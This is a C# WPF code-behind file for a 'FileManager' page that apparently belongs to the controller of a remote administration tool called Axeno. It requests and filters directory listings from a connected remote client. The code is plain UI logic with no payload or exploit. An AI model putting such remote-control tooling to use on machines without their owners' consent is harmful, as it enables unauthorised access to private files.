using Axeno.Helper;
using Axeno.Networking.Connection;
using Axeno.Networking.Functions.Networking;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.Windows.Threading;

namespace Axeno.Views.Pages.ClientManager
{
    /// <summary>
    /// Interaction logic for FileManager.xaml
    /// </summary>
    public partial class FileManager : Page
    {
        public static Client Client { get; set; }
        private DispatcherTimer debounceTimer;
        private const int DebounceDelay = 500; // milliseconds

        public FileManager(Client cli)
        {
            InitializeComponent();
            cli.fManager = this;
            Client = cli;
            lvinfo.IsEnabled = false;
            cli.Send(HandleFileManager.Initiate());
            debounceTimer = new DispatcherTimer();
            debounceTimer.Interval = TimeSpan.FromMilliseconds(DebounceDelay);
            debounceTimer.Tick += DebounceTimer_Tick;
        }



        private void DebounceTimer_Tick(object sender, EventArgs e)
        {
            debounceTimer.Stop();
            lvinfo.Items.Filter = GetFilter();
        }
        private void tbsortlv_TextChanged(object sender, TextChangedEventArgs e)
        {
            debounceTimer.Stop();
            debounceTimer.Start();
        }
        private bool ProcNameFilter(object obj)
        {

            var filterobj = obj as FileManagerlv;
            return filterobj.fName.ToLower().Contains(tbsortlv.Text);
        }
        public Predicate<object> GetFilter()
        {
            return ProcNameFilter;
        }

        private void lvinfo_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            if (lvinfo.SelectedItem != null)
            {

                FileManagerlv f = lvinfo.SelectedItem as FileManagerlv;
                
                if(f.fType == "File")
                {
                    return;
                }
                Client.Send(HandleFileManager.GetDirectory(f.fullpath, false));
                lvinfo.Items.Clear();

                lvinfo.IsEnabled = false;
                progring.Visibility = Visibility.Visible;

            }
        }

        private void backbtn_Click(object sender, RoutedEventArgs e)
        {
            if(lvinfo.Items.Count > 0)
            {
                FileManagerlv f = lvinfo.Items[0] as FileManagerlv;
                Client.Send(HandleFileManager.GetDirectory(f.parent, true));
                lvinfo.Items.Clear();

                lvinfo.IsEnabled = false;
                progring.Visibility = Visibility.Visible;
            }

        }
    }
}
